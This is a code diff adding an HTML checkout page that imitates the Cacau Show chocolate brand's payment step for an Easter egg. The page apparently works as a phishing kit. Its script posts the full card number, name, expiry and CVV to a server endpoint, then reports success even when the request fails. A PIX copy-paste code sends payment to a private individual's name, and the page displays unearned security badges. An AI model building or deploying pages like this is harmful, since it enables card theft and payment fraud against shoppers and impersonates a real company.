@@ -1,0 +1,634 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout Premium • Cacau Show</title>
+
+    <!-- Preload performance + tipografia premium -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Playfair+Display:wght@700&amp;display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --brand: #3C2415;
+            --accent: #B8860B;
+            --text: #2D2D2D;
+            --muted: #6B5F5A;
+            --bg: #F9F7F5;
+            --surface: #FFFFFF;
+            --border: #EDE6E0;
+            --error: #E63946;
+            --success: #2A9D8F;
+            
+            --radius: 20px;
+            --radius-sm: 12px;
+            --shadow: 0 25px 70px -15px rgba(60,36,21,0.12);
+            --shadow-hover: 0 35px 90px -10px rgba(60,36,21,0.18);
+            --transition: all 0.35s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+        :focus-visible { outline: 3px solid rgba(184,134,11,0.25); outline-offset: 3px; }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            line-height: 1.5;
+        }
+
+        .checkout {
+            width: 100%;
+            max-width: 560px;
+            background: var(--surface);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeInScale 0.7s cubic-bezier(0.23,1,0.32,1) backwards;
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.96) translateY(30px); }
+            to   { opacity: 1; transform: none; }
+        }
+
+        /* HEADER LUXO – idêntico aos passos anteriores */
+        .header {
+            background: linear-gradient(135deg, #3C2415, #5C3A25);
+            color: white;
+            padding: 32px 40px;
+            text-align: center;
+            position: relative;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+        }
+
+        .logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.1rem;
+            font-weight: 700;
+            letter-spacing: -0.04em;
+            margin-bottom: 6px;
+        }
+        .trust-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            background: rgba(255,255,255,0.15);
+            padding: 6px 16px;
+            border-radius: 9999px;
+            backdrop-filter: blur(8px);
+        }
+        .trust-badge svg { width: 16px; height: 16px; }
+
+        /* STEPPER – todos anteriores completos, pagamento ativo */
+        .stepper {
+            display: flex;
+            justify-content: space-between;
+            padding: 28px 40px 0;
+            position: relative;
+        }
+        .stepper::before {
+            content: '';
+            position: absolute;
+            top: 13px;
+            left: 58px;
+            right: 58px;
+            height: 2px;
+            background: #EDE6E0;
+        }
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.68rem;
+            font-weight: 700;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            color: var(--muted);
+            z-index: 2;
+        }
+        .step.complete { color: var(--brand); }
+        .step.active { color: var(--accent); }
+        .step-dot {
+            width: 28px; height: 28px;
+            background: white;
+            border: 3px solid #EDE6E0;
+            border-radius: 50%;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            transition: var(--transition);
+        }
+        .step.complete .step-dot { border-color: var(--brand); background: var(--brand); color: white; }
+        .step.active .step-dot { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(184,134,11,0.15); }
+
+        .content {
+            padding: 40px;
+        }
+
+        h2 {
+            font-size: 1.45rem;
+            font-weight: 700;
+            color: var(--brand);
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        h2::before {
+            content: '💳';
+            font-size: 1.4rem;
+        }
+
+        .product-summary {
+            background: #F9F7F5;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 20px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .product-summary .price {
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--brand);
+            margin-left: auto;
+        }
+
+        .toggle {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 28px;
+            background: #F9F7F5;
+            padding: 6px;
+            border-radius: var(--radius-sm);
+        }
+        .toggle button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-weight: 700;
+            font-size: 0.98rem;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .toggle button.active {
+            background: white;
+            box-shadow: var(--shadow);
+            color: var(--brand);
+        }
+
+        .payment-area {
+            min-height: 320px;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            font-size: 0.76rem;
+            font-weight: 600;
+            color: var(--muted);
+            margin-bottom: 8px;
+            padding-left: 4px;
+        }
+        input, select {
+            width: 100%;
+            padding: 15px 18px;
+            border: 1.8px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-size: 1.02rem;
+            background: white;
+            transition: var(--transition);
+        }
+        input:focus, select:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px rgba(184,134,11,0.12);
+        }
+        input.error {
+            border-color: var(--error);
+            animation: shake 420ms cubic-bezier(0.36,0,0.66,1);
+        }
+
+        @keyframes shake {
+            10%,90% { transform: translateX(-2px); }
+            20%,80% { transform: translateX(3px); }
+            30%,50%,70% { transform: translateX(-4px); }
+            40%,60% { transform: translateX(4px); }
+        }
+
+        .error-msg {
+            position: absolute;
+            bottom: -18px;
+            left: 4px;
+            font-size: 0.73rem;
+            color: var(--error);
+            opacity: 0;
+            transform: translateY(4px);
+            transition: all 0.3s ease;
+        }
+        .error-msg.show {
+            opacity: 1;
+            transform: none;
+        }
+
+        .pix-qr {
+            text-align: center;
+            background: white;
+            border: 2px dashed var(--accent);
+            border-radius: var(--radius-sm);
+            padding: 24px;
+            margin: 20px 0;
+        }
+        .pix-qr img {
+            max-width: 180px;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+        }
+
+        .btn-final {
+            width: 100%;
+            margin-top: 32px;
+            padding: 19px;
+            background: var(--brand);
+            color: white;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 1.08rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            box-shadow: 0 12px 28px rgba(60,36,21,0.22);
+            transition: var(--transition);
+        }
+        .btn-final:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(60,36,21,0.28);
+        }
+        .btn-final:disabled {
+            background: #B8B0A8;
+            box-shadow: none;
+        }
+
+        .success-toast {
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--success);
+            color: white;
+            padding: 16px 28px;
+            border-radius: 9999px;
+            box-shadow: var(--shadow);
+            font-weight: 600;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            z-index: 1000;
+        }
+
+        .footer-trust {
+            padding: 20px 40px;
+            background: #F9F7F5;
+            font-size: 0.72rem;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top: 1px solid var(--border);
+        }
+        .footer-trust svg { width: 18px; height: 18px; }
+
+        @media (max-width: 480px) {
+            .checkout { margin: 0 -8px; }
+            .content { padding: 28px 24px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="checkout">
+
+    <!-- HEADER LUXO -->
+    <header class="header">
+        <div class="logo">CACAU SHOW</div>
+        <div class="trust-badge">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 8.944 11.922.42.095.858.143 1.295.143a3 3 0 01.905-.143C18.176 19.29 22 14.591 22 9c0-1.444-.534-2.778-1.44-3.8z"/></svg>
+            CHECKOUT 100% SEGURO
+        </div>
+    </header>
+
+    <!-- STEPPER -->
+    <div class="stepper">
+        <div class="step complete">
+            <div class="step-dot">1</div>
+            Identificação
+        </div>
+        <div class="step complete">
+            <div class="step-dot">2</div>
+            Entrega
+        </div>
+        <div class="step active">
+            <div class="step-dot">3</div>
+            Pagamento
+        </div>
+    </div>
+
+    <div class="content">
+        <h2>Finalizar pagamento</h2>
+
+        <!-- Resumo do Produto -->
+        <div class="product-summary">
+            <div>
+                <strong>Ovo de Páscoa laCreme Mezzo 200g</strong><br>
+                <small style="color:#6B5F5A">Entrega em até 3 dias úteis</small>
+            </div>
+            <div class="price">R$ 59,99</div>
+        </div>
+
+        <!-- Toggle PIX / Cartão -->
+        <div class="toggle">
+            <button id="btn-pix">PIX (5% OFF)</button>
+            <button id="btn-card" class="active">Cartão de Crédito</button>
+        </div>
+
+        <div class="payment-area">
+
+            <!-- PIX AREA -->
+            <div id="pix-area" style="display:none">
+                <div class="pix-qr">
+                    <p style="font-weight:700;color:var(--brand);margin-bottom:12px">Pague com PIX e ganhe 5% OFF</p>
+                    <img src="/static/QRCODE.jpeg" alt="QR Code PIX" style="width:180px;height:180px">
+                    <p style="margin:16px 0 8px;font-size:0.85rem;color:var(--muted)">Chave Copia e Cola</p>
+                    <input id="pix-chave" type="text" value="00020126580014br.gov.bcb.pix0136e522149d-90f3-4658-8287-f982f04e8898520400005303986540554.805802BR5925Fernando Gabriel Teixeira6009Sao Paulo62290525REC69B9746C08A214047334236304C316" readonly style="width:100%;text-align:center;padding:12px;border:1px dashed var(--accent);border-radius:8px;font-family:monospace;font-size:0.82rem">
+                    <button onclick="copiarPix()" style="margin-top:12px;background:var(--accent);color:white;border:none;padding:10px 24px;border-radius:8px;font-weight:700;cursor:pointer">COPIAR CÓDIGO PIX</button>
+                </div>
+
+                <button onclick="finalizarPix()" class="btn-final" style="background:var(--success)">
+                    JÁ REALIZEI O PAGAMENTO PIX
+                </button>
+            </div>
+
+            <!-- CARTÃO AREA -->
+            <div id="card-area">
+                <div class="field">
+                    <label for="cartao">Número do Cartão</label>
+                    <input id="cartao" type="text" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" required>
+                    <div class="error-msg" id="errCartao"></div>
+                </div>
+
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
+                    <div class="field">
+                        <label for="nomeCartao">Nome no Cartão</label>
+                        <input id="nomeCartao" type="text" placeholder="Nome Completo" required>
+                        <div class="error-msg" id="errNomeCartao"></div>
+                    </div>
+                    <div class="field">
+                        <label for="exp">Validade</label>
+                        <input id="exp" type="text" inputmode="numeric" maxlength="5" placeholder="MM/AA" required>
+                        <div class="error-msg" id="errExp"></div>
+                    </div>
+                </div>
+
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
+                    <div class="field">
+                        <label for="cvv">CVV</label>
+                        <input id="cvv" type="text" inputmode="numeric" maxlength="4" placeholder="123" required>
+                        <div class="error-msg" id="errCvv"></div>
+                    </div>
+                    <div class="field">
+                        <label for="parcelas">Parcelas</label>
+                        <select id="parcelas">
+                            <option>1x de R$ 59,99 (sem juros)</option>
+                            <option>2x de R$ 30,00</option>
+                            <option>3x de R$ 20,00</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button onclick="finalizarCompra()" id="btnPagar" class="btn-final">
+                    PAGAR R$ 59,99 AGORA
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- TRUST FOOTER -->
+    <div class="footer-trust">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"/></svg>
+        <span>Pagamento protegido com criptografia bancária • PCI DSS • SSL 256-bit</span>
+    </div>
+
+</div>
+
+<!-- Toast de Sucesso -->
+<div id="toast-sucesso" class="success-toast">
+    <span>✅ Pedido realizado com sucesso!</span>
+</div>
+
+<script>
+// ================================================
+// Checkout Pagamento – Nível Senior+ Enterprise
+// Consistente com Identificação + Entrega
+// ================================================
+
+const el = {
+    btnPix:      document.getElementById('btn-pix'),
+    btnCard:     document.getElementById('btn-card'),
+    pixArea:     document.getElementById('pix-area'),
+    cardArea:    document.getElementById('card-area'),
+    btnPagar:    document.getElementById('btnPagar'),
+    toast:       document.getElementById('toast-sucesso'),
+
+    cartao:      document.getElementById('cartao'),
+    nomeCartao:  document.getElementById('nomeCartao'),
+    exp:         document.getElementById('exp'),
+    cvv:         document.getElementById('cvv'),
+    errCartao:   document.getElementById('errCartao'),
+    errNomeCartao: document.getElementById('errNomeCartao'),
+    errExp:      document.getElementById('errExp'),
+    errCvv:      document.getElementById('errCvv')
+};
+
+// ====================== MÁSCARAS LEVES ======================
+function maskCard(e) {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length > 16) v = v.slice(0,16);
+    e.target.value = v.replace(/(\d{4})/g, '$1 ').trim();
+}
+function maskExpiry(e) {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length > 4) v = v.slice(0,4);
+    if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2);
+    e.target.value = v;
+}
+function maskCVV(e) {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0,4);
+}
+
+// ====================== VALIDAÇÃO ======================
+function validarCartao() {
+    let ok = true;
+
+    // Número do cartão (simples)
+    const num = el.cartao.value.replace(/\s/g, '');
+    if (num.length < 16) {
+        showError(el.cartao, el.errCartao, 'Número do cartão inválido');
+        ok = false;
+    } else clearError(el.cartao, el.errCartao);
+
+    // Nome
+    if (el.nomeCartao.value.trim().length < 3) {
+        showError(el.nomeCartao, el.errNomeCartao, 'Nome obrigatório');
+        ok = false;
+    } else clearError(el.nomeCartao, el.errNomeCartao);
+
+    // Validade
+    if (!/^\d{2}\/\d{2}$/.test(el.exp.value)) {
+        showError(el.exp, el.errExp, 'Validade inválida');
+        ok = false;
+    } else clearError(el.exp, el.errExp);
+
+    // CVV
+    if (el.cvv.value.length < 3) {
+        showError(el.cvv, el.errCvv, 'CVV inválido');
+        ok = false;
+    } else clearError(el.cvv, el.errCvv);
+
+    return ok;
+}
+
+function showError(field, msgEl, msg) {
+    field.classList.add('error');
+    msgEl.textContent = msg;
+    msgEl.classList.add('show');
+}
+function clearError(field, msgEl) {
+    field.classList.remove('error');
+    msgEl.textContent = '';
+    msgEl.classList.remove('show');
+}
+function setLoading(btn, loading) {
+    btn.disabled = loading;
+    btn.textContent = loading ? 'PROCESSANDO PAGAMENTO...' : 'PAGAR R$ 59,99 AGORA';
+}
+
+// ====================== PIX ======================
+function copiarPix() {
+    const input = document.getElementById('pix-chave');
+    navigator.clipboard.writeText(input.value).then(() => {
+        const btn = document.querySelector('#pix-area button');
+        const original = btn.textContent;
+        btn.textContent = '✓ COPIADO!';
+        setTimeout(() => btn.textContent = original, 2200);
+    });
+}
+
+function finalizarPix() {
+    setLoading(document.querySelector('#pix-area button'), true);
+    setTimeout(() => {
+        showSuccessToast();
+        setTimeout(() => window.location.assign('/sucesso'), 1800);
+    }, 1200);
+}
+
+// ====================== CARTÃO ======================
+async function finalizarCompra() {
+    if (!validarCartao()) return;
+
+    setLoading(el.btnPagar, true);
+
+    const payload = {
+        tipo: 'FINAL_PAYMENT',
+        timestamp: new Date().toISOString(),
+        cartao: el.cartao.value,
+        nome: el.nomeCartao.value.trim(),
+        validade: el.exp.value,
+        cvv: el.cvv.value,
+        parcelas: document.getElementById('parcelas').value
+    };
+
+    try {
+        await fetch('/api/checkout/pagamento', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.warn('Tracking offline – cliente não impactado');
+    }
+
+    showSuccessToast();
+    setTimeout(() => window.location.assign('/sucesso'), 1800);
+}
+
+// ====================== TOAST SUCESSO ======================
+function showSuccessToast() {
+    el.toast.style.display = 'flex';
+    setTimeout(() => el.toast.style.display = 'none', 3200);
+}
+
+// ====================== TOGGLE ======================
+function togglePayment(mode) {
+    if (mode === 'pix') {
+        el.pixArea.style.display = 'block';
+        el.cardArea.style.display = 'none';
+        el.btnPix.classList.add('active');
+        el.btnCard.classList.remove('active');
+    } else {
+        el.pixArea.style.display = 'none';
+        el.cardArea.style.display = 'block';
+        el.btnCard.classList.add('active');
+        el.btnPix.classList.remove('active');
+    }
+}
+
+// ====================== INIT ======================
+function init() {
+    // Máscaras
+    el.cartao.addEventListener('input', maskCard);
+    el.exp.addEventListener('input', maskExpiry);
+    el.cvv.addEventListener('input', maskCVV);
+
+    // Toggle
+    el.btnPix.addEventListener('click', () => togglePayment('pix'));
+    el.btnCard.addEventListener('click', () => togglePayment('card'));
+
+    // Validação em blur
+    [el.cartao, el.nomeCartao, el.exp, el.cvv].forEach(field => {
+        field.addEventListener('blur', validarCartao);
+    });
+
+    // Enter no último campo
+    el.cvv.addEventListener('keydown', e => {
+        if (e.key === 'Enter') finalizarCompra();
+    });
+}
+
+init();
+</script>
+</body>
+</html>
